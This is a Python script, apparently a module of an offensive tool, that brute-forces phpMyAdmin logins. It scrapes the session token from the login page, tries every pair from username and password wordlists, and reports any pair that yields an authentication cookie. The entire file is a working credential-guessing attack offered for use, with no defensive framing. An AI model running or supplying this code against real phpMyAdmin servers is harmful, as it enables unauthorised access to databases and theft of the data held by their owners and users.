#!/usr/bin/env python3
import requests
import html
import sys, os, re
from config.color_config import INFO, found, not_found, action_not_found, action_found

def login(url, username, password):
    for i in range(3):
        try:
            res = requests.get(url)
            cookies = dict(res.cookies)
            data = {
                'set_session': html.unescape(re.search(r"name=\"set_session\" value=\"(.+?)\"", res.text, re.I).group(1)),
                'token': html.unescape(re.search(r"name=\"token\" value=\"(.+?)\"", res.text, re.I).group(1)),
                'pma_username': username,
                'pma_password': password,
            }
            res = requests.post(url, cookies=cookies, data=data)
            cookies = dict(res.cookies)
            return 'pmaAuth-1' in cookies
        except KeyboardInterrupt:
            print("i Canceled by keyboard interrupt (Ctrl-C)")
            sys.exit()
        except:
            pass
    return False

def pma(url, wordlist, user_known):

    username = user_known if user_known else "credz/wordlists/top_default_username.txt"

    if url is None:
        parser.print_help()
        return

    #Getting passwords
    try:
        f = open(wordlist, "r")
        passwords = re.split("[\r\n]+", f.read())
        f.close()
    except:
        print("[-] Failed to read '%s' file." % (wordlist))
        return

    try:
        f = open(username, "r")
        users = re.split("[\r\n]+", f.read())
        f.close()
    except:
        users = [username]

    for user in users:
        for password in passwords:
            if login(url, user, password):
                print("  {}Account found: {}:{}".format(found, user, password))
                sys.exit()
            sys.stdout.write("\033[34 i Username: {} | Password: {}\033[0m\r".format(user, password))
            sys.stdout.write("\033[K")